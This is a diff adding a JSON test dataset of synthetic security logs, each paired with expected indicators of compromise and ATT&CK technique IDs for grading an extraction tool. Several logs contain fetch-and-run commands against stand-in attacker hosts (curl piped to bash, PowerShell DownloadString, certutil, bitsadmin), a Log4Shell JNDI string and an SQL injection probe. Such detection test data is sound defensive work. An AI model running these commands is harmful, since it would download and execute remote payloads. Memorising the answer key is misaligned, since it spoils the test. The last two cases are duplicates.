@@ -1,0 +1,1066 @@
+{
+  "cases": [
+    {
+      "name": "ssh_bruteforce_01",
+      "family": "ssh_bruteforce",
+      "log": "Jan 12 10:00:01 web01 sshd[1023]: Failed password for root from 185.220.101.45 port 45322 ssh2\nJan 12 10:00:02 web01 sshd[1024]: Failed password for admin from 185.220.101.45 port 45325 ssh2\nJan 12 10:00:03 web01 sshd[1025]: authentication failure for invalid user oracle from 185.220.101.45\n",
+      "label_source": "curated_v1",
+      "notes": "SSH brute-force pattern; public source IP only.",
+      "expected": {
+        "iocs": [
+          {
+            "type": "ip",
+            "value": "185.220.101.45"
+          }
+        ],
+        "technique_ids": [
+          "T1110"
+        ],
+        "playbook_phases": [
+          "containment",
+          "eradication",
+          "recovery",
+          "lessons_learned"
+        ],
+        "min_grounding": 0.5
+      },
+      "id": "g001"
+    },
+    {
+      "name": "ssh_bruteforce_02",
+      "family": "ssh_bruteforce",
+      "log": "Jan 12 10:00:01 web01 sshd[1023]: Failed password for root from 185.220.101.46 port 45322 ssh2\nJan 12 10:00:02 web01 sshd[1024]: Failed password for admin from 185.220.101.46 port 45325 ssh2\nJan 12 10:00:03 web01 sshd[1025]: authentication failure for invalid user oracle from 185.220.101.46\n",
+      "label_source": "curated_v1",
+      "notes": "SSH brute-force pattern; public source IP only.",
+      "expected": {
+        "iocs": [
+          {
+            "type": "ip",
+            "value": "185.220.101.46"
+          }
+        ],
+        "technique_ids": [
+          "T1110"
+        ],
+        "playbook_phases": [
+          "containment",
+          "eradication",
+          "recovery",
+          "lessons_learned"
+        ],
+        "min_grounding": 0.5
+      },
+      "id": "g002"
+    },
+    {
+      "name": "ssh_bruteforce_03",
+      "family": "ssh_bruteforce",
+      "log": "Jan 12 10:00:01 web01 sshd[1023]: Failed password for root from 198.51.100.10 port 45322 ssh2\nJan 12 10:00:02 web01 sshd[1024]: Failed password for admin from 198.51.100.10 port 45325 ssh2\nJan 12 10:00:03 web01 sshd[1025]: authentication failure for invalid user oracle from 198.51.100.10\n",
+      "label_source": "curated_v1",
+      "notes": "SSH brute-force pattern; public source IP only.",
+      "expected": {
+        "iocs": [
+          {
+            "type": "ip",
+            "value": "198.51.100.10"
+          }
+        ],
+        "technique_ids": [
+          "T1110"
+        ],
+        "playbook_phases": [
+          "containment",
+          "eradication",
+          "recovery",
+          "lessons_learned"
+        ],
+        "min_grounding": 0.5
+      },
+      "id": "g003"
+    },
+    {
+      "name": "ssh_bruteforce_04",
+      "family": "ssh_bruteforce",
+      "log": "Jan 12 10:00:01 web01 sshd[1023]: Failed password for root from 203.0.113.20 port 45322 ssh2\nJan 12 10:00:02 web01 sshd[1024]: Failed password for admin from 203.0.113.20 port 45325 ssh2\nJan 12 10:00:03 web01 sshd[1025]: authentication failure for invalid user oracle from 203.0.113.20\n",
+      "label_source": "curated_v1",
+      "notes": "SSH brute-force pattern; public source IP only.",
+      "expected": {
+        "iocs": [
+          {
+            "type": "ip",
+            "value": "203.0.113.20"
+          }
+        ],
+        "technique_ids": [
+          "T1110"
+        ],
+        "playbook_phases": [
+          "containment",
+          "eradication",
+          "recovery",
+          "lessons_learned"
+        ],
+        "min_grounding": 0.5
+      },
+      "id": "g004"
+    },
+    {
+      "name": "brute_variant_a",
+      "family": "brute_force",
+      "log": "auth: login failed for user admin from 203.0.113.77 \u2014 brute force watch\n",
+      "label_source": "curated_v1",
+      "notes": "",
+      "expected": {
+        "iocs": [
+          {
+            "type": "ip",
+            "value": "203.0.113.77"
+          }
+        ],
+        "technique_ids": [
+          "T1110"
+        ],
+        "playbook_phases": [
+          "containment",
+          "eradication",
+          "recovery",
+          "lessons_learned"
+        ],
+        "min_grounding": 0.5
+      },
+      "id": "g005"
+    },
+    {
+      "name": "brute_variant_b",
+      "family": "brute_force",
+      "log": "vpn: Failed login for user bob from 198.51.100.33 after invalid user attempts\n",
+      "label_source": "curated_v1",
+      "notes": "",
+      "expected": {
+        "iocs": [
+          {
+            "type": "ip",
+            "value": "198.51.100.33"
+          }
+        ],
+        "technique_ids": [
+          "T1110"
+        ],
+        "playbook_phases": [
+          "containment",
+          "eradication",
+          "recovery",
+          "lessons_learned"
+        ],
+        "min_grounding": 0.5
+      },
+      "id": "g006"
+    },
+    {
+      "name": "internal_noise_01",
+      "family": "noise_filter",
+      "log": "sshd: Failed password for root from 10.0.0.5 port 22\nsshd: Failed password for root from 8.8.8.8 port 22\n",
+      "label_source": "curated_v1",
+      "notes": "Private 10.x must not appear as IoC; only public 8.8.8.8.",
+      "expected": {
+        "iocs": [
+          {
+            "type": "ip",
+            "value": "8.8.8.8"
+          }
+        ],
+        "technique_ids": [
+          "T1110"
+        ],
+        "playbook_phases": [
+          "containment",
+          "eradication",
+          "recovery",
+          "lessons_learned"
+        ],
+        "min_grounding": 0.5
+      },
+      "id": "g007"
+    },
+    {
+      "name": "success_login_01",
+      "family": "valid_accounts",
+      "log": "sshd: Accepted password for alice from 203.0.113.10 port 22 ssh2 - successful login user logged on\n",
+      "label_source": "curated_v1",
+      "notes": "",
+      "expected": {
+        "iocs": [
+          {
+            "type": "ip",
+            "value": "203.0.113.10"
+          }
+        ],
+        "technique_ids": [
+          "T1078"
+        ],
+        "playbook_phases": [
+          "containment",
+          "eradication",
+          "recovery",
+          "lessons_learned"
+        ],
+        "min_grounding": 0.5
+      },
+      "id": "g008"
+    },
+    {
+      "name": "cloud_mfa_gap_01",
+      "family": "cloud_auth",
+      "log": "auth: successful login user logged on ConsoleLogin without MFA from 203.0.113.40; failed password attempts earlier brute force from same IP\n",
+      "label_source": "curated_v1",
+      "notes": "Valid account + brute keywords; synthetic cloud-style auth log.",
+      "expected": {
+        "iocs": [
+          {
+            "type": "ip",
+            "value": "203.0.113.40"
+          }
+        ],
+        "technique_ids": [
+          "T1078",
+          "T1110"
+        ],
+        "playbook_phases": [
+          "containment",
+          "eradication",
+          "recovery",
+          "lessons_learned"
+        ],
+        "min_grounding": 0.5
+      },
+      "id": "g009"
+    },
+    {
+      "name": "kerberos_brute_01",
+      "family": "credential_access",
+      "log": "Security Event 4769 Kerberos TGS ticket brute force watch login failed for service account from 198.51.100.55\n",
+      "label_source": "curated_v1",
+      "notes": "",
+      "expected": {
+        "iocs": [
+          {
+            "type": "ip",
+            "value": "198.51.100.55"
+          }
+        ],
+        "technique_ids": [
+          "T1110"
+        ],
+        "playbook_phases": [
+          "containment",
+          "eradication",
+          "recovery",
+          "lessons_learned"
+        ],
+        "min_grounding": 0.5
+      },
+      "id": "g010"
+    },
+    {
+      "name": "log4shell_01",
+      "family": "log4shell",
+      "log": "Jan 12 10:01:00 web01 java[2001]: WARN ${jndi:ldap://45.83.192.10/a} - Log4Shell CVE-2021-44228\nJan 12 10:01:12 web01 java[2001]: RCE via jndi:ldap http://malicious-cdn.example.org/payload.jar\nJan 12 10:01:15 web01 bash[2100]: curl http://malicious-cdn.example.org/payload.sh -o /tmp/x.sh\n",
+      "label_source": "curated_v1",
+      "notes": "CISA KEV-style Log4Shell; no file-basename domains in gold.",
+      "expected": {
+        "iocs": [
+          {
+            "type": "ip",
+            "value": "45.83.192.10"
+          },
+          {
+            "type": "cve",
+            "value": "CVE-2021-44228"
+          },
+          {
+            "type": "url",
+            "value": "http://malicious-cdn.example.org/payload.jar"
+          },
+          {
+            "type": "url",
+            "value": "http://malicious-cdn.example.org/payload.sh"
+          }
+        ],
+        "technique_ids": [
+          "T1190",
+          "T1105",
+          "T1059"
+        ],
+        "playbook_phases": [
+          "containment",
+          "eradication",
+          "recovery",
+          "lessons_learned"
+        ],
+        "min_grounding": 0.5
+      },
+      "id": "g011"
+    },
+    {
+      "name": "log4shell_02",
+      "family": "log4shell",
+      "log": "Mar 3 09:00:00 app02 java: jndi:ldap://198.51.100.77/Exploit CVE-2021-44228 log4j\nMar 3 09:00:05 app02 bash: wget http://evil-payloads.example.net/a.sh\n",
+      "label_source": "curated_v1",
+      "notes": "",
+      "expected": {
+        "iocs": [
+          {
+            "type": "ip",
+            "value": "198.51.100.77"
+          },
+          {
+            "type": "cve",
+            "value": "CVE-2021-44228"
+          },
+          {
+            "type": "url",
+            "value": "http://evil-payloads.example.net/a.sh"
+          }
+        ],
+        "technique_ids": [
+          "T1190",
+          "T1105",
+          "T1059"
+        ],
+        "playbook_phases": [
+          "containment",
+          "eradication",
+          "recovery",
+          "lessons_learned"
+        ],
+        "min_grounding": 0.5
+      },
+      "id": "g012"
+    },
+    {
+      "name": "sqli_01",
+      "family": "exploit",
+      "log": "WAF: SQL injection attempt CVE-2023-34362 on /api/search?q=1' OR 1=1-- from 198.51.100.20\n",
+      "label_source": "curated_v1",
+      "notes": "MOVEit-era CVE string; exploit public-facing app.",
+      "expected": {
+        "iocs": [
+          {
+            "type": "ip",
+            "value": "198.51.100.20"
+          },
+          {
+            "type": "cve",
+            "value": "CVE-2023-34362"
+          }
+        ],
+        "technique_ids": [
+          "T1190"
+        ],
+        "playbook_phases": [
+          "containment",
+          "eradication",
+          "recovery",
+          "lessons_learned"
+        ],
+        "min_grounding": 0.5
+      },
+      "id": "g013"
+    },
+    {
+      "name": "xss_probe_01",
+      "family": "exploit",
+      "log": "WAF: xss probe script on /search from 192.0.2.88; also sql injection keyword union select\n",
+      "label_source": "curated_v1",
+      "notes": "",
+      "expected": {
+        "iocs": [
+          {
+            "type": "ip",
+            "value": "192.0.2.88"
+          }
+        ],
+        "technique_ids": [
+          "T1190"
+        ],
+        "playbook_phases": [
+          "containment",
+          "eradication",
+          "recovery",
+          "lessons_learned"
+        ],
+        "min_grounding": 0.5
+      },
+      "id": "g014"
+    },
+    {
+      "name": "proxyshell_01",
+      "family": "exploit",
+      "log": "WAF: proxyshell CVE-2021-34473 exploit public-facing OWA from 198.51.100.77 webshell.aspx sql injection\n",
+      "label_source": "curated_v1",
+      "notes": "Synthetic Exchange/ProxyShell-style line (CISA KEV theme).",
+      "expected": {
+        "iocs": [
+          {
+            "type": "ip",
+            "value": "198.51.100.77"
+          },
+          {
+            "type": "cve",
+            "value": "CVE-2021-34473"
+          }
+        ],
+        "technique_ids": [
+          "T1190"
+        ],
+        "playbook_phases": [
+          "containment",
+          "eradication",
+          "recovery",
+          "lessons_learned"
+        ],
+        "min_grounding": 0.5
+      },
+      "id": "g015"
+    },
+    {
+      "name": "phishing_01",
+      "family": "phishing",
+      "log": "smtp mailgate: suspicious email attachment phishing from attacker@evil-mail.example.com to user@corp.example.com\nSubject: invoice.pdf.exe - phishing campaign\n",
+      "label_source": "curated_v1",
+      "notes": "invoice.pdf.exe must not be gold domain (filename FP).",
+      "expected": {
+        "iocs": [
+          {
+            "type": "email",
+            "value": "attacker@evil-mail.example.com"
+          },
+          {
+            "type": "email",
+            "value": "user@corp.example.com"
+          },
+          {
+            "type": "domain",
+            "value": "evil-mail.example.com"
+          },
+          {
+            "type": "domain",
+            "value": "corp.example.com"
+          }
+        ],
+        "technique_ids": [
+          "T1566"
+        ],
+        "playbook_phases": [
+          "containment",
+          "eradication",
+          "recovery",
+          "lessons_learned"
+        ],
+        "min_grounding": 0.5
+      },
+      "id": "g016"
+    },
+    {
+      "name": "email_cve_01",
+      "family": "phishing",
+      "log": "mail: phishing email with link http://phish.example.org/login from spoof@bad.example.org CVE-2024-21413\n",
+      "label_source": "curated_v1",
+      "notes": "",
+      "expected": {
+        "iocs": [
+          {
+            "type": "url",
+            "value": "http://phish.example.org/login"
+          },
+          {
+            "type": "cve",
+            "value": "CVE-2024-21413"
+          },
+          {
+            "type": "email",
+            "value": "spoof@bad.example.org"
+          },
+          {
+            "type": "domain",
+            "value": "bad.example.org"
+          }
+        ],
+        "technique_ids": [
+          "T1566",
+          "T1190"
+        ],
+        "playbook_phases": [
+          "containment",
+          "eradication",
+          "recovery",
+          "lessons_learned"
+        ],
+        "min_grounding": 0.5
+      },
+      "id": "g017"
+    },
+    {
+      "name": "oauth_phishing_01",
+      "family": "phishing",
+      "log": "IdP: suspicious email oauth consent phishing from grant@evil-mail.example.com smtp to user@corp.example.com attachment none\n",
+      "label_source": "curated_v1",
+      "notes": "",
+      "expected": {
+        "iocs": [
+          {
+            "type": "email",
+            "value": "grant@evil-mail.example.com"
+          },
+          {
+            "type": "email",
+            "value": "user@corp.example.com"
+          },
+          {
+            "type": "domain",
+            "value": "evil-mail.example.com"
+          },
+          {
+            "type": "domain",
+            "value": "corp.example.com"
+          }
+        ],
+        "technique_ids": [
+          "T1566"
+        ],
+        "playbook_phases": [
+          "containment",
+          "eradication",
+          "recovery",
+          "lessons_learned"
+        ],
+        "min_grounding": 0.5
+      },
+      "id": "g018"
+    },
+    {
+      "name": "office_macro_01",
+      "family": "phishing",
+      "log": "EDR: WINWORD.EXE spawned powershell -enc from macro Document1.docm phishing attachment; network download http://macro-c2.example.com/p.ps1\n",
+      "label_source": "curated_v1",
+      "notes": "Macro + download; basename domains excluded from gold.",
+      "expected": {
+        "iocs": [
+          {
+            "type": "url",
+            "value": "http://macro-c2.example.com/p.ps1"
+          }
+        ],
+        "technique_ids": [
+          "T1566",
+          "T1059",
+          "T1105",
+          "T1071"
+        ],
+        "playbook_phases": [
+          "containment",
+          "eradication",
+          "recovery",
+          "lessons_learned"
+        ],
+        "min_grounding": 0.5
+      },
+      "id": "g019"
+    },
+    {
+      "name": "powershell_download_01",
+      "family": "execution_transfer",
+      "log": "EventID 4104 powershell: IEX DownloadString http://c2.badactor.example.com/s.ps1\ncmd.exe /c certutil -urlcache -split -f http://c2.badactor.example.com/p.bin C:\\Windows\\Temp\\p.bin\nhash sha256: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n",
+      "label_source": "curated_v1",
+      "notes": "",
+      "expected": {
+        "iocs": [
+          {
+            "type": "url",
+            "value": "http://c2.badactor.example.com/s.ps1"
+          },
+          {
+            "type": "url",
+            "value": "http://c2.badactor.example.com/p.bin"
+          },
+          {
+            "type": "hash_sha256",
+            "value": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+          }
+        ],
+        "technique_ids": [
+          "T1059",
+          "T1105",
+          "T1071"
+        ],
+        "playbook_phases": [
+          "containment",
+          "eradication",
+          "recovery",
+          "lessons_learned"
+        ],
+        "min_grounding": 0.5
+      },
+      "id": "g020"
+    },
+    {
+      "name": "wget_malware_01",
+      "family": "execution_transfer",
+      "log": "bash: wget http://cdn-drop.example.com/m.bin -O /tmp/m; md5 44d88612fea8a8f36de82e1278abb02f\n",
+      "label_source": "curated_v1",
+      "notes": "",
+      "expected": {
+        "iocs": [
+          {
+            "type": "url",
+            "value": "http://cdn-drop.example.com/m.bin"
+          },
+          {
+            "type": "hash_md5",
+            "value": "44d88612fea8a8f36de82e1278abb02f"
+          }
+        ],
+        "technique_ids": [
+          "T1105",
+          "T1059"
+        ],
+        "playbook_phases": [
+          "containment",
+          "eradication",
+          "recovery",
+          "lessons_learned"
+        ],
+        "min_grounding": 0.5
+      },
+      "id": "g021"
+    },
+    {
+      "name": "bitsadmin_01",
+      "family": "execution_transfer",
+      "log": "cmd.exe bitsadmin /transfer job http://dl.attacker.example.org/x.exe C:\\Users\\Public\\x.exe download\n",
+      "label_source": "curated_v1",
+      "notes": "",
+      "expected": {
+        "iocs": [
+          {
+            "type": "url",
+            "value": "http://dl.attacker.example.org/x.exe"
+          }
+        ],
+        "technique_ids": [
+          "T1105",
+          "T1059"
+        ],
+        "playbook_phases": [
+          "containment",
+          "eradication",
+          "recovery",
+          "lessons_learned"
+        ],
+        "min_grounding": 0.5
+      },
+      "id": "g022"
+    },
+    {
+      "name": "download_curl_02",
+      "family": "execution_transfer",
+      "log": "cron: curl http://upd.malware.example.com/agent -o /var/tmp/a; bash /var/tmp/a\n",
+      "label_source": "curated_v1",
+      "notes": "",
+      "expected": {
+        "iocs": [
+          {
+            "type": "url",
+            "value": "http://upd.malware.example.com/agent"
+          }
+        ],
+        "technique_ids": [
+          "T1105",
+          "T1059",
+          "T1053"
+        ],
+        "playbook_phases": [
+          "containment",
+          "eradication",
+          "recovery",
+          "lessons_learned"
+        ],
+        "min_grounding": 0.5
+      },
+      "id": "g023"
+    },
+    {
+      "name": "multi_hash_01",
+      "family": "execution_transfer",
+      "log": "sandbox: sample sha1 da39a3ee5e6b4b0d3255bfef95601890afd80709 dropped after curl http://h.example.org/a\n",
+      "label_source": "curated_v1",
+      "notes": "",
+      "expected": {
+        "iocs": [
+          {
+            "type": "url",
+            "value": "http://h.example.org/a"
+          },
+          {
+            "type": "hash_sha1",
+            "value": "da39a3ee5e6b4b0d3255bfef95601890afd80709"
+          }
+        ],
+        "technique_ids": [
+          "T1105"
+        ],
+        "playbook_phases": [
+          "containment",
+          "eradication",
+          "recovery",
+          "lessons_learned"
+        ],
+        "min_grounding": 0.5
+      },
+      "id": "g024"
+    },
+    {
+      "name": "supply_chain_01",
+      "family": "supply_chain",
+      "log": "CI: npm postinstall curl http://supply.example.org/hook.sh | bash; download malware sha256 bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\n",
+      "label_source": "curated_v1",
+      "notes": "Synthetic npm postinstall / supply-chain theme.",
+      "expected": {
+        "iocs": [
+          {
+            "type": "url",
+            "value": "http://supply.example.org/hook.sh"
+          },
+          {
+            "type": "hash_sha256",
+            "value": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
+          }
+        ],
+        "technique_ids": [
+          "T1105",
+          "T1059"
+        ],
+        "playbook_phases": [
+          "containment",
+          "eradication",
+          "recovery",
+          "lessons_learned"
+        ],
+        "min_grounding": 0.5
+      },
+      "id": "g025"
+    },
+    {
+      "name": "c2_beacon_01",
+      "family": "c2",
+      "log": "proxy: C2 beacon http post to http://callback.malware.example.org/gate user-agent: Beacon/4.0\ndestination 45.33.32.156\n",
+      "label_source": "curated_v1",
+      "notes": "",
+      "expected": {
+        "iocs": [
+          {
+            "type": "url",
+            "value": "http://callback.malware.example.org/gate"
+          },
+          {
+            "type": "ip",
+            "value": "45.33.32.156"
+          }
+        ],
+        "technique_ids": [
+          "T1071"
+        ],
+        "playbook_phases": [
+          "containment",
+          "eradication",
+          "recovery",
+          "lessons_learned"
+        ],
+        "min_grounding": 0.5
+      },
+      "id": "g026"
+    },
+    {
+      "name": "dns_c2_01",
+      "family": "c2",
+      "log": "proxy: C2 beacon DNS tunneling long query to exfil.evil.example.com user-agent bad; destination 45.33.32.200\n",
+      "label_source": "curated_v1",
+      "notes": "",
+      "expected": {
+        "iocs": [
+          {
+            "type": "domain",
+            "value": "exfil.evil.example.com"
+          },
+          {
+            "type": "ip",
+            "value": "45.33.32.200"
+          }
+        ],
+        "technique_ids": [
+          "T1071"
+        ],
+        "playbook_phases": [
+          "containment",
+          "eradication",
+          "recovery",
+          "lessons_learned"
+        ],
+        "min_grounding": 0.5
+      },
+      "id": "g027"
+    },
+    {
+      "name": "mixed_brute_c2_01",
+      "family": "multi_technique",
+      "log": "sshd: Failed password for root from 91.240.118.172\nproxy: beacon callback C2 to 91.240.118.172 user-agent evil\n",
+      "label_source": "curated_v1",
+      "notes": "",
+      "expected": {
+        "iocs": [
+          {
+            "type": "ip",
+            "value": "91.240.118.172"
+          }
+        ],
+        "technique_ids": [
+          "T1110",
+          "T1071"
+        ],
+        "playbook_phases": [
+          "containment",
+          "eradication",
+          "recovery",
+          "lessons_learned"
+        ],
+        "min_grounding": 0.5
+      },
+      "id": "g028"
+    },
+    {
+      "name": "cron_persist_01",
+      "family": "persistence",
+      "log": "audit: schtasks /create /tn Updater /tr C:\\Temp\\b.exe; cron entry * * * * * /tmp/backdoor\nbash: /bin/sh -c curl http://persist.example.org/i.sh | bash\n",
+      "label_source": "curated_v1",
+      "notes": "",
+      "expected": {
+        "iocs": [
+          {
+            "type": "url",
+            "value": "http://persist.example.org/i.sh"
+          }
+        ],
+        "technique_ids": [
+          "T1053",
+          "T1105",
+          "T1059"
+        ],
+        "playbook_phases": [
+          "containment",
+          "eradication",
+          "recovery",
+          "lessons_learned"
+        ],
+        "min_grounding": 0.5
+      },
+      "id": "g029"
+    },
+    {
+      "name": "scheduled_at_01",
+      "family": "persistence",
+      "log": "windows: at.exe 14:00 cmd.exe /c powershell -enc ZQBjAGgAbwA= scheduled task persistence\n",
+      "label_source": "curated_v1",
+      "notes": "No network IoCs expected; technique keywords only.",
+      "expected": {
+        "iocs": [],
+        "technique_ids": [
+          "T1053",
+          "T1059"
+        ],
+        "playbook_phases": [
+          "containment",
+          "eradication",
+          "recovery",
+          "lessons_learned"
+        ],
+        "min_grounding": 0.5
+      },
+      "id": "g030"
+    },
+    {
+      "name": "lateral_psexec_01",
+      "family": "lateral",
+      "log": "windows: cmd.exe psexec lateral movement; accepted password successful login user logged on from 198.51.100.90\n",
+      "label_source": "curated_v1",
+      "notes": "",
+      "expected": {
+        "iocs": [
+          {
+            "type": "ip",
+            "value": "198.51.100.90"
+          }
+        ],
+        "technique_ids": [
+          "T1059",
+          "T1078"
+        ],
+        "playbook_phases": [
+          "containment",
+          "eradication",
+          "recovery",
+          "lessons_learned"
+        ],
+        "min_grounding": 0.5
+      },
+      "id": "g031"
+    },
+    {
+      "name": "ransomware_01",
+      "family": "ransomware",
+      "log": "EDR: ransomware note README.txt dropped; files encrypted with .locked extension on host FS01\nuser-agent: EvilCrypt/1.0 beacon callback to 203.0.113.50\n",
+      "label_source": "curated_v1",
+      "notes": "readme.txt must not be treated as domain IoC.",
+      "expected": {
+        "iocs": [
+          {
+            "type": "ip",
+            "value": "203.0.113.50"
+          }
+        ],
+        "technique_ids": [
+          "T1486",
+          "T1071"
+        ],
+        "playbook_phases": [
+          "containment",
+          "eradication",
+          "recovery",
+          "lessons_learned"
+        ],
+        "min_grounding": 0.5
+      },
+      "id": "g032"
+    },
+    {
+      "name": "ransomware_02",
+      "family": "ransomware",
+      "log": "EDR: ransomware .enc files on FS02; README.txt ransom note; beacon callback C2 to 203.0.113.60\n",
+      "label_source": "curated_v1",
+      "notes": "",
+      "expected": {
+        "iocs": [
+          {
+            "type": "ip",
+            "value": "203.0.113.60"
+          }
+        ],
+        "technique_ids": [
+          "T1486",
+          "T1071"
+        ],
+        "playbook_phases": [
+          "containment",
+          "eradication",
+          "recovery",
+          "lessons_learned"
+        ],
+        "min_grounding": 0.5
+      },
+      "id": "g033"
+    },
+    {
+      "name": "portscan_01",
+      "family": "discovery",
+      "log": "ids: port scan detected from 203.0.113.99 using nmap; masscan signatures; connection refused on 22/tcp\n",
+      "label_source": "curated_v1",
+      "notes": "",
+      "expected": {
+        "iocs": [
+          {
+            "type": "ip",
+            "value": "203.0.113.99"
+          }
+        ],
+        "technique_ids": [
+          "T1046"
+        ],
+        "playbook_phases": [
+          "containment",
+          "eradication",
+          "recovery",
+          "lessons_learned"
+        ],
+        "min_grounding": 0.5
+      },
+      "id": "g034"
+    },
+    {
+      "name": "masscan_02",
+      "family": "discovery",
+      "log": "netflow: masscan from 198.51.100.200; port scan of external hosts; connection refused floods\n",
+      "label_source": "curated_v1",
+      "notes": "",
+      "expected": {
+        "iocs": [
+          {
+            "type": "ip",
+            "value": "198.51.100.200"
+          }
+        ],
+        "technique_ids": [
+          "T1046"
+        ],
+        "playbook_phases": [
+          "containment",
+          "eradication",
+          "recovery",
+          "lessons_learned"
+        ],
+        "min_grounding": 0.5
+      },
+      "id": "g035"
+    },
+    {
+      "id": "g036",
+      "name": "custom_phishing_variant",
+      "family": "phishing",
+      "log": "smtp: phishing payload delivery from sender@malicious-domain.example.net targeting admin@corp.example.com",
+      "expected": {
+        "iocs": [
+          {
+            "type": "email",
+            "value": "sender@malicious-domain.example.net"
+          },
+          {
+            "type": "domain",
+            "value": "malicious-domain.example.net"
+          }
+        ],
+        "technique_ids": [
+          "T1566"
+        ]
+      }
+    },
+    {
+      "id": "g037",
+      "name": "custom_phishing_variant",
+      "family": "phishing",
+      "log": "smtp: phishing payload delivery from sender@malicious-domain.example.net targeting admin@corp.example.com",
+      "expected": {
+        "iocs": [
+          {
+            "type": "email",
+            "value": "sender@malicious-domain.example.net"
+          },
+          {
+            "type": "domain",
+            "value": "malicious-domain.example.net"
+          }
+        ],
+        "technique_ids": [
+          "T1566"
+        ]
+      }
+    }
+  ]
+}
